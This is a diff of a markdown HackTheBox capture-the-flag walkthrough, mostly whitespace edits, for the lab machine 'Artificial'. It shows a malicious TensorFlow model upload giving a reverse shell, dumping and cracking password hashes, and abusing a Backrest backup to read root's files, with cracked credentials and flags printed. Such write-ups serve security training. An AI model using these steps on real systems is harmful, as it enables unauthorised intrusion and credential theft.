@@ -1,21 +1,29 @@
 ---
-title: "Artificial Machine (HackTheBox) — Step-by-Step Walkthrough"
-date: "2025-07-22"
+title: 'Artificial Machine (HackTheBox) — Step-by-Step Walkthrough'
+date: '2025-07-22'
 draft: false
-tags: ["linux", "hackthebox", "easy", "tensorflow", "malicious-model", "privilege-escalation"]
-summary: "Compromise of a Linux HackTheBox machine by uploading a malicious TensorFlow HDF5 model to exploit remote code execution, extracting and cracking MD5 credentials from a SQLite database, then escalating privileges by recovering a Bcrypt-hashed password from a Backrest backup archive and abusing the Backrest web UI to read the root flag."
-images: ["/static/images/artifical/preview.png"]
+tags:
+  [
+    'linux',
+    'hackthebox',
+    'Machine',
+    'easy',
+    'tensorflow',
+    'malicious-model',
+    'privilege-escalation',
+  ]
+summary: 'Compromise of a Linux HackTheBox machine by uploading a malicious TensorFlow HDF5 model to exploit remote code execution, extracting and cracking MD5 credentials from a SQLite database, then escalating privileges by recovering a Bcrypt-hashed password from a Backrest backup archive and abusing the Backrest web UI to read the root flag.'
+images: ['/static/images/artifical/preview.png']
 ---
 
 ![Artificial](/static/images/artifical/image.png)
-
 
 target Ip : `10.10.11.74`
 
 ## Pinging
 
 ```bash
-                                                                                                               
+
 ┌──(kali㉿kali)-[~]
 └─$ ping 10.10.11.74
 PING 10.10.11.74 (10.10.11.74) 56(84) bytes of data.
@@ -31,16 +39,16 @@ rtt min/avg/max/mdev = 364.530/885.924/1652.003/553.352 ms, pipe 2
 ## Nmap Scan
 
 ```bash
-                                                                                                               
+
 ┌──(kali㉿kali)-[~]
-└─$ nmap -sCV  10.10.11.74  
+└─$ nmap -sCV  10.10.11.74
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 08:43 EDT
 Nmap scan report for 10.10.11.74
 Host is up (0.64s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
 |   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
 |_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
@@ -60,18 +68,17 @@ I need to add the domain [`http://artificial.htb/`](http://artificial.htb/) to t
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ sudo nano /etc/hosts            
-[sudo] password for kali: 
+└─$ sudo nano /etc/hosts
+[sudo] password for kali:
 ```
 
 ![Artifical](/static/images/artifical/image%201.png)
-
 
 I accessed the IP in my browser since `port 80 was open`, indicating an `HTTP` service was running
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ firefox 10.10.11.74 &           
+└─$ firefox 10.10.11.74 &
 [1] 87842
 ```
 
@@ -81,7 +88,7 @@ I registered on the website and then login and get to the dashboard
 
 ![Artifical](/static/images/artifical/image%203.png)
 
-So there was an example code given on the machine before registering 
+So there was an example code given on the machine before registering
 
 ## Uploading the `example_codes` **`model.h5`** file
 
@@ -123,7 +130,7 @@ model.compile(optimizer='adam', loss='mean_squared_error')
 model.fit(X, y, epochs=100, verbose=1)
 
 # Save the model
-model.save('profits_model.h5') 
+model.save('profits_model.h5')
 ```
 
 I decided to **train this code and upload its `.h5` file** to observe how the website handles the upload. Before attempting to gain a shell, I'm first analyzing the website's behavior and functionality.
@@ -192,16 +199,16 @@ After installing Docker on my machine, I set up the Docker container using the f
  => => extracting sha256:3971691a363796c39467aae4cdce6ef773273fe6bfc67154d01e1b589befb912                                                                0.0s
  => [2/4] WORKDIR /code                                                                                                                                  0.3s
  => [3/4] RUN apt-get update &&     apt-get install -y curl &&     curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d124  119.0s
- => [4/4] RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl                                              72.4s 
- => exporting to image                                                                                                                                  11.1s 
- => => exporting layers                                                                                                                                 11.1s 
- => => writing image sha256:a0da0861a775681557f68c633bb910257621f7bbb8d5c740ee7494fd2ddb5180                                                             0.0s 
- => => naming to docker.io/library/my-env                                                                                                                0.0s 
-                                                                                                                                                              
-┌──(work)─(kali㉿kali)-[~/Artificial]
-└─$ sudo docker run -it my-env 
+ => [4/4] RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl                                              72.4s
+ => exporting to image                                                                                                                                  11.1s
+ => => exporting layers                                                                                                                                 11.1s
+ => => writing image sha256:a0da0861a775681557f68c633bb910257621f7bbb8d5c740ee7494fd2ddb5180                                                             0.0s
+ => => naming to docker.io/library/my-env                                                                                                                0.0s
 
-root@7ac4a934bfac:/code# 
+┌──(work)─(kali㉿kali)-[~/Artificial]
+└─$ sudo docker run -it my-env
+
+root@7ac4a934bfac:/code#
 ```
 
 ### Training :
@@ -209,7 +216,7 @@ root@7ac4a934bfac:/code#
 First, I needed to **transfer `example_code.py` into the Docker container** to use it within the containerized environment.
 
 ```bash
-                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Artificial]
 └─$ sudo docker cp example_code.py 7ac4a934bfac:/code/
 
@@ -241,7 +248,7 @@ Collecting pytz>=2020.1
 ```
 
 ```docker
-root@7ac4a934bfac:/code# python example_code.py 
+root@7ac4a934bfac:/code# python example_code.py
 2025-08-02 16:49:46.572642: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.
 2025-08-02 16:49:46.642854: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.
 2025-08-02 16:49:46.643726: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
@@ -280,17 +287,17 @@ example_code.py  profits_model.h5  tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_1
 Now i have to sent **`“profits_model.h5”` back to my machine from this docker environment**
 
 ```bash
-                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Artificial]
-└─$ sudo docker ps                                     
-[sudo] password for kali: 
+└─$ sudo docker ps
+[sudo] password for kali:
 CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES
 7ac4a934bfac   my-env    "/bin/bash"   19 minutes ago   Up 19 minutes             cranky_noyce
-                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Artificial]
-└─$ sudo docker cp 7ac4a934bfac:/code/profits_model.h5 ~/Artificial 
+└─$ sudo docker cp 7ac4a934bfac:/code/profits_model.h5 ~/Artificial
 Successfully copied 85.5kB to /home/kali/Artificial
-                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Artificial]
 └─$ la
 Dockerfile  example_code.py  profits_model.h5
@@ -311,7 +318,6 @@ By viewing the page source **`(Ctrl + U)`**, I discovered that the server runs t
 I researched potential exploits and found a relevant one documented here:
 
 [**TensorFlow Remote Code Execution via Malicious Model**](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)
-
 
 ![Artifical](/static/images/artifical/image%208.png)
 
@@ -337,7 +343,7 @@ I transferred the **`exploit.py`** file to my Docker environment and successfull
 ```python
 root@7ac4a934bfac:/code# ls
 example_code.py  exploit.py  profits_model.h5  tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
-root@7ac4a934bfac:/code# python exploit.py 
+root@7ac4a934bfac:/code# python exploit.py
 2025-08-02 17:08:47.392158: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.
 2025-08-02 17:08:47.451761: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.
 2025-08-02 17:08:47.452523: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
@@ -348,7 +354,7 @@ sh: 1: nc: not found
   saving_api.save_model(
 root@7ac4a934bfac:/code# ls
 example_code.py  exploit.h5  exploit.py  profits_model.h5  tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl
-root@7ac4a934bfac:/code# 
+root@7ac4a934bfac:/code#
 ```
 
 I then transferred the **`exploit.h5`** file back to my local machine and set up a listener on **`port 4444`** before uploading the model.
@@ -363,11 +369,11 @@ Boom — after clicking **"View Prediction"**, the reverse shell successfully co
 
 ```python
 ┌──(kali㉿kali)-[~/Artificial]
-└─$ nc -lvnp 4444  
+└─$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.37] from (UNKNOWN) [10.10.11.74] 34092
 /bin/sh: 0: can't access tty; job control turned off
-$ 
+$
 ```
 
 made it stable :
@@ -376,13 +382,13 @@ made it stable :
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 app@artificial:~/app$ ^Z
 zsh: suspended  nc -lvnp 4444
-                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Artificial]
 └─$ stty raw -echo; fg
 
 [1]  + continued  nc -lvnp 4444
 
-app@artificial:~/app$ 
+app@artificial:~/app$
 ```
 
 I looked around and found a database i.e. **`user.db`**
@@ -394,15 +400,15 @@ app@artificial:~/app/instance$ sqlite3 users.db
 SQLite version 3.31.1 2020-01-27 19:55:54
 Enter ".help" for usage hints.
 sqlite> .tables
-model  user 
+model  user
 sqlite> .schema user
 CREATE TABLE user (
-	id INTEGER NOT NULL, 
-	username VARCHAR(100) NOT NULL, 
-	email VARCHAR(120) NOT NULL, 
-	password VARCHAR(200) NOT NULL, 
-	PRIMARY KEY (id), 
-	UNIQUE (username), 
+	id INTEGER NOT NULL,
+	username VARCHAR(100) NOT NULL,
+	email VARCHAR(120) NOT NULL,
+	password VARCHAR(200) NOT NULL,
+	PRIMARY KEY (id),
+	UNIQUE (username),
 	UNIQUE (email)
 );
 sqlite> SELECT * from user;
@@ -414,7 +420,7 @@ sqlite> SELECT * from user;
 6|test|test2@test.com|5416d7cd6ef195a0f7622a9c56b55e84
 7|b3ta-blocker|spam@example.com|81dc9bdb52d04dc20036dbd8313ed055
 8|user|user@spam.com|81dc9bdb52d04dc20036dbd8313ed055
-sqlite> 
+sqlite>
 ```
 
 i found different users and there hashes
@@ -450,8 +456,8 @@ Cracked it — password for **gael** is `mattp005numbertwo`.
 
 ```python
 @artificial:/home$ su gael
-Password: 
-gael@artificial:/home$ 
+Password:
+gael@artificial:/home$
 ```
 
 # User Flag
@@ -462,7 +468,7 @@ app  gael
 gael@artificial:/home$ cd
 gael@artificial:~$ ls
 user.txt
-gael@artificial:~$ cat user.txt 
+gael@artificial:~$ cat user.txt
 927fecec7fada68c4f477ae6b3d956c3
 ```
 
@@ -477,9 +483,9 @@ gael@artificial:/$ ls -lah /root
 ls: cannot open directory '/root': Permission denied
 ```
 
-Clearly can’t access the `/root`  
+Clearly can’t access the `/root`
 
-so i then get the [**`linpeas.sh`**](http://linpeas.sh) by setting up a python server on from y hacking machine 
+so i then get the [**`linpeas.sh`**](http://linpeas.sh) by setting up a python server on from y hacking machine
 
 ![Artifical](/static/images/artifical/image%2012.png)
 
@@ -491,7 +497,7 @@ Found some active ports, but **`9898`** was hidden from Nmap — setting up **`l
 
 ### Local port forwarding
 
-syntax : 
+syntax :
 
 ```bash
 ssh -L <local_port>:<target_host>:<target_port> <ssh_user>@<ssh_gateway>
@@ -502,7 +508,7 @@ ssh -L <local_port>:<target_host>:<target_port> <ssh_user>@<ssh_gateway>
 ┌──(kali㉿kali)-[~/Artificial]
 └─$ ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
 
-gael@10.10.11.74's password: 
+gael@10.10.11.74's password:
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -534,7 +540,7 @@ To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 Last login: Sat Aug 2 17:59:56 2025 from 10.10.16.37
-gael@artificial:~$ 
+gael@artificial:~$
 
 ```
 
@@ -542,7 +548,7 @@ gael@artificial:~$
 
 Gael’s creds didn’t work here,
 
-Looked into Backrest backup 
+Looked into Backrest backup
 
 ```bash
 gael@artificial:/var/backups$ ls -laZ
@@ -563,7 +569,7 @@ Didn’t have permission to extract the file in place, so I extracted it in the 
 
 ```bash
 l@artificial:/var/backups$ tar -xf /var/backups/backrest_backup.tar.gz -C /tmp
-gael@artificial:/var/backups$ 
+gael@artificial:/var/backups$
 ```
 
 it worked !
@@ -572,7 +578,7 @@ it worked !
 gael@artificial:/tmp$ cd backrest/.config/backrest/
 gael@artificial:/tmp/backrest/.config/backrest$ ls
 config.json
-gael@artificial:/tmp/backrest/.config/backrest$ cat config.json 
+gael@artificial:/tmp/backrest/.config/backrest$ cat config.json
 {
   "modno": 2,
   "version": 4,
@@ -587,7 +593,7 @@ gael@artificial:/tmp/backrest/.config/backrest$ cat config.json
     ]
   }
 }
-gael@artificial:/tmp/backrest/.config/backrest$ 
+gael@artificial:/tmp/backrest/.config/backrest$
 ```
 
 username : **`backrest_root`**
@@ -597,30 +603,30 @@ Bcrypt : **`JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1
 ┌──(kali㉿kali)-[~]
 └─$ echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d | tee roothash
 
-$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO                                                                                                                                                              
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
 
 ┌──(kali㉿kali)-[~]
 └─$ hashcat -a 0 -m 3200 -w 3 --force roothash /usr/share/wordlists/rockyou.txt
 
-                                                                                                                                                           
+
 ┌──(kali㉿kali)-[~]
 └─$ hashcat -m 3200 roothash --show
 $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
-  
+
 ```
 
-username : **`backrest_root` 
-password : `!@#$%^`** 
+username : **`backrest_root`
+password : `!@#$%^`**
 
 ## Login success
 
 ![Artifical](/static/images/artifical/image%2015.png)
 
-I then added a repository seems like cron 
+I then added a repository seems like cron
 
 ![Artifical](/static/images/artifical/image%2016.png)
 
-Used `Restic CLI commands` ****to initialize a repo in **`/tmp`**, restored the `/root` backup, then dumped root.txt from the shell to capture the **root flag**.
+Used `Restic CLI commands` \***\*to initialize a repo in **`/tmp`**, restored the `/root` backup, then dumped root.txt from the shell to capture the **root flag\*\*.
 
 ![Artifical](/static/images/artifical/image%2017.png)
 
